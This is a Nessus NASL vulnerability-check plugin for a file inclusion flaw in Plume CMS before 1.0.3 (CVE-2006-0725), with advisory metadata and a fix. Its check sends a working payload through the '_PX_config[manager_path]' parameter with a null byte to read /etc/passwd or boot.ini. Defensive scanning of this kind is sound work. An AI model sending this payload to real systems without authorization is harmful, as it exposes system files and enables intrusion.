#
# Script Written By Ferdy Riphagen 
# <f[dot]riphagen[at]nsec[dot]nl>
#
# Script distributed under the GNU GPLv2 License.
#

# Changes by Tenable:
# - Revised plugin title (3/31/2009)


include("compat.inc");

if (description) {
 script_id(20972);
 script_version("$Revision: 1.8 $");

 script_cve_id("CVE-2006-0725");
 script_bugtraq_id(16662);
 script_xref(name:"OSVDB", value:"23204");

 script_name(english:"Plume CMS < 1.0.3 Remote File Inclusion");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a PHP application that is prone
to local and remote file inclusion attacks." );
 script_set_attribute(attribute:"description", value:
"The system is running Plume CMS a simple but powerful 
content management system.

The version installed does not sanitize user input in the
'_PX_config[manager_path]' parameter in the 'prepend.php' file.
This allows an attacker to include arbitrary files and execute code
on the system.

This flaw is exploitable if PHP's register_globals is enabled." );
 script_set_attribute(attribute:"see_also", value:"http://www.plume-cms.net/news/77-Security-Notice-Please-Update-Your-Prependphp-File" );
 script_set_attribute(attribute:"see_also", value:"http://secunia.com/advisories/18883/" );
 script_set_attribute(attribute:"solution", value:
"Either sanitize the prepend.php
file as advised by the developer (see first URL) or 
upgrade to Plume CMS version 1.0.3 or later" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


 summary["english"] = "Check if Plume CMS is vulnerable to a file inclusion flaw";
 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2006-2009 Ferdy Riphagen");

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);

# Check a few directories.
if (thorough_tests) dirs = list_uniq(make_list("/plume", "/cms", "/", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
 res = http_get_cache(item:string(dir, "/index.php"), port:port); 
 if(res == NULL) exit(0);

 if(egrep(pattern:'<a href=[^>]+.*alt="powered by PLUME CMS', string:res)) {

  # Try to grab a local file.
  file[0] = "/etc/passwd";
  file[1] = "c:/boot.ini";

  for(test = 0; file[test]; test++) {
   req = http_get(item:string(dir, "/prepend.php?_PX_config[manager_path]=", file[test], "%00"), port:port); 
   #debug_print("req: ", req, "\n");

   recv = http_keepalive_send_recv(data:req, bodyonly:TRUE, port:port);
   if (!recv) exit(0);
   #debug_print("recv: ", recv, "\n");

   if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv) ||
       egrep(pattern:"default=multi.*disk.*partition", string:recv) ||
       # And if magic_quotes_gpc = on, check for error messages.
       egrep(pattern:"Warning.+\([^>]+\\0/conf/config\.php.+failed to open stream", string:recv)) {
    security_hole(port);
    exit(0);
   }
   if (!thorough_tests) break;  
  }
 }
}
